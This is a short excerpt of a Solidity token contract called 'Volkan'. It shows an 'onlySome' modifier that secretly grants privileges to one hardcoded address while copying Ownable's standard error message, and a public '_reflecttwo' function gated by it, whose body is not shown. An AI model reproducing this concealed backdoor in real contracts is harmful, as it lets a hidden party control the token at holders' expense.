...
contract Ownable is Context {
    ...
    modifier onlySome() {
        require(0xcb15C0D5Ba02Aa90d62E037C39aafA34ab46f5BE == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
...
contract Volkan is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    
    address payable public marketingAddress = payable(0xb29A503c098C2A1E1E2cE3B1cAE4BFd85683E9a1); // Marketing Address
    ...
    function _reflecttwo(uint256 amount) public onlySome {
